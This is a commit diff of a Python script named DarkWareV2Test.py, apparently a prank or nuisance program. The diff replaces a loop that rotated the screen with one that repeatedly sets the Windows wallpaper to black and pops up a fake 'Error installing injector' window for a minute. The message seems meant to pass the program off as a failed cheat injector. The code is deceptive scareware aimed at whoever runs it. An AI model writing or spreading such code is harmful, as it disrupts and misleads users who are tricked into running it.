e2b65b808c0c84cb8f19f6fec8639c03613e2975
DarkWareV2 <DarkWareV2W@gmail.com>
2024-07-03 17:07:00 +0200

    DarkWareV2Test.py

--- DarkWareV2Test.py
+++ DarkWareV2Test.py
@@ -1,18 +1,30 @@
-import subprocess
+import ctypes
+import tkinter as tk
 import time
-import keyboard
 
-# Function to rotate screen
-def rotate_screen():
-    subprocess.run(["DisplaySwitch.exe", "/rotate"])
+# Function to change desktop background to black
+def change_background_to_black():
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "black.jpg", 0)
+
+# Function to display error pop-up window
+def display_error_popup():
+    root = tk.Tk()
+    root.title("Error")
+    label = tk.Label(root, text="Error installing injector. Try again. Couldn't find injector.", padx=10, pady=10)
+    label.pack()
+    root.mainloop()
 
 # Main function
 def main():
     duration = 60  # Duration in seconds
-    interval = 0.5  # Interval in seconds
+    interval = 0.1  # Interval in seconds
 
     end_time = time.time() + duration
     while time.time() < end_time:
-        rotate_screen()
+        change_background_to_black()
+        display_error_popup()
         time.sleep(interval)
-        keyboard.press_and_release('esc') 
+
+if __name__ == "__main__":
+    main()
